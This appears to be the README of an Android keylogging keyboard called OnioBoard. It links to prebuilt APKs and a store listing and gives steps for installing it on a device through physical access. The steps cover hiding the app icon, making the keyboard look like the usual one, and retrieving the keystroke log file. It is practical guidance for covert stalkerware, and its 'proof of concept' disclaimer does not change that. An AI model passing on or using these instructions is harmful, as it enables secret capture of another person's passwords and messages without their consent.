# OnioBoard-Android-KeyLogger
Android Keylogging Keyboard

## Download

Build it from source or use [prebuilt apks.](https://github.com/IceWreck/OnioBoard-Android-Keylogger/raw/master/releases/OnioBoard-1.1.apk) 

[Play Store](https://play.google.com/store/apps/details?id=com.onion.onioboard) 


## Usage

Note: You need to have physical access to the device for use.

* Install app.
* Open the _language and input_ section in the System Settings if it does not automatically open after install
* Enable Onioboard and disable all other forms of input.
* The homescreen icon is hidden by default. OnioBoard Settings can be accessed by tapping OnioBoard in the language and input section of system settings.
* There are tons of settings to make it look and behave like your usual keyboard including theme support.
* Keystroke logs can be accessed via your file manager. 

`Internal Storage > Android > Data > com.onion.onioboard > files > onioboard-files.txt `

## ScreenShots

![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/1.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/2.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/3.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/4.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/5.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/6.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/7.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/8.png)
![screenshot](https://raw.githubusercontent.com/IceWreck/OnioBoard-Android-Keylogger/master/screenshots/9.png)


## Obligatory Notice
This was designed as a proof of concept and not for any malacious purposes.

## Credits
Based on the Android Open Source Project Keyboard and [Simple Keyboard](https://github.com/rkkr/simple-keyboard/)

